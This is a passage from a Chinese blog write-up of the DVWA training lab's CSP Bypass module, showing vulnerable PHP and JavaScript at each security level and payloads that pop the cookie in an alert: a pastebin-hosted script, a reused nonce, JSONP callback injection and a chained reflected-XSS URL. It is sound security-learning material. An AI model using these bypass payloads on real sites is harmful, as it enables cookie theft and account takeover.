`Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;`

后面三个是不可能被利用了。查看`https://pastebin.com`发现是一个在线的剪贴板网站，可以在上面临时或永久存储一些内容。那么就有办法注入一些代码了。
输入`alert(document.cookie)`，时间设置为永久，隐私设置为公开后创建，然后在跳转的页面上有一个`raw`按钮，点击就可以获得只包含文本的网址：<https://pastebin.com/raw/HfwLNgu2>

将这个网址输入后提交，成功弹出Cookie：

![](https://images.hujiekang.top/blogimage-ba768b36a230382c440c3e441acd711f-c1606cb1.png)

源代码：

```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.

header($headerCSP);

# https://pastebin.com/raw/R570EE00

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

## 安全等级`Medium`

`Medium`等级的界面提示输入的所有内容都会直接被放在页面中：

![](https://images.hujiekang.top/blogimage-05781d7aceb8e4a364eb453d6dd0e5f5-7cc75499.png)

查看CSP，发现允许带有特定`nonce token`的内联脚本（包括`<script>`标签、`javascript::URL`、HTML事件、`<style>`标签中的脚本）运行:
`Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';`

所以按CSP来看，包含在`<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="></script>`内的脚本将会被运行。
输入`<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>`，成功弹出Cookie：

![](https://images.hujiekang.top/blogimage-495198fc1dddccb4842c8ce1d6f965ed-0773fb9b.png)

```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

## 安全等级`High`

页面提示，使用了`jsonp.php`加载了一些代码：

![](https://images.hujiekang.top/blogimage-c21be960a51b87935255820fcd40eb56-d7bdfcbc.png)

直接看代码：

```php
// 主页面代码
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';
```
```javascript
// high.js
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}
var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

可以看见主页面只允许同域名下的脚本加载。
接下来分析整个代码流程：
1. 用户按下按钮后，`clickButton()`函数在页面里创建了一个来源为`source/jsonp.php`的`<script>`标签，来源会回调`solveSum()`函数
2. `solveSum()`函数将传入的对象中的`answer`键对应的值显示在页面上

查询资料发现这种调用方式叫做JSONP，是专门用于处理跨域请求的一种方式。JSONP会返回一个函数调用语句，函数的内部是一组JSON格式的数据，而调用的函数名称则由请求时传参传给跨域的服务器。更多有关JSONP的信息参见<https://blog.csdn.net/hansexploration/article/details/80314948>。

得知了JSONP的工作原理之后，那么就不妨访问一下`source/jsonp.php?callback=solveSum`，看看会返回什么内容：

![](https://images.hujiekang.top/blogimage-414a9a38f4fd1f6c543dac0c9bcf1b4d-a778e7f5.png)

可以发现，可以通过控制`callback`参数的值来控制返回的内容。而返回的内容又将被加载为JavaScript代码，那么尝试将`high.js`中的`callback`改为`alert(document.cookie)//`，再重新加载页面，弹出了Cookie：

![](https://images.hujiekang.top/blogimage-f14956955ca31a8b54a3b81400d52f85-b702c593.png)

至于这个点的利用，可以使用XSS中`High`等级的漏洞来访问`source/jsonp.php?callback=alert(document.cookie)//`，这个我在之前的文章也有写到：[DVWA练习记录(一)](https://www.hujiekang.top/2020/02/05/DVWA_1/#%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7High-1)

Payload：`http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<img src=1 onerror=eval(unescape(location.hash.substr(1)))>#d=document;h=d.getElementsByTagName('head').item(0);s=d.createElement('script');s.setAttribute('src','http://127.0.0.1/DVWA/vulnerabilities/csp/source/jsonp.php?callback=alert(document.cookie)//');h.appendChild(s)`

## 安全等级`Impossible`

`Impossible`是基于`High`修改而来的，它依然使用JSONP发起请求，但是确定死了JSONP返回的内容，不让外部参数改变输出的内容；除此之外，CSP方面只允许来自本地服务器的外部脚本，且不允许内联代码，进一步提高了安全性。

![](https://images.hujiekang.top/blogimage-925430cc0b0838980d030a4a3d1b3b27-29cd9511.png)

源代码：

```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.</p><p>The CSP settings only allow external JavaScript on the local server and no inline code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/impossible.js"></script>
';
```
```javascript
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp_impossible.php";
    document.body.appendChild(s);
}
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}
var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

<!--# JavaScript

## 安全等级`Low`
## 安全等级`Medium`
## 安全等级`High`
## 安全等级`Impossible`
-->
# 总结

刷完了整个DVWA，也算是大致掌握了Web安全中各种漏洞的大类和来源，也学到了不少PHP代码审计的内容，也算是让我这个新手入了门。
当然从DVWA的GitHub页面上也能看到，各个页面的主程序最后一次更新也是两年前了，而这两年也新增了不少漏洞，所以还需要继续学习，与时俱进。

从各个模块的`Impossible`代码来看，应用最多的技术无非就是那几种，它们看起来很不起眼，但是在实际环境中却非常的重要：
1. HTML编码、HTML实体以及字符的转义：这些技术的使用都是为了防止输入数据的二义性，防止数据输入之后产生恶意代码，如XSS、SQL注入等。
2. PDO：PDO可谓是提交SQL语句的最终解决方案。数据和代码严格分离、统一的操作接口，既提高了便利性也增强了安全性。
3. 白名单原则、最小权限原则：很多时候我们总是想着，用户不应该做哪些事情，只要限制用户不让他做这些事情，系统就安全了。但是随着技术的发展或是本身考虑不周全，总会有新的、意想不到的手段使得系统再次变得不安全。最好的办法就是，只让用户做这些事情，只给予用户活动范围内的权限。
4. Anti-CSRF Token：CSRF攻击的施展是极其容易的，或许也就是在这些模块中，Anti-CSRF Token出现的频率最高的原因吧。

能力有限，只总结出了这几点，如有不当之处，敬请指正。

参考书籍：[《白帽子讲Web安全》](https://book.douban.com/subject/10546925/)
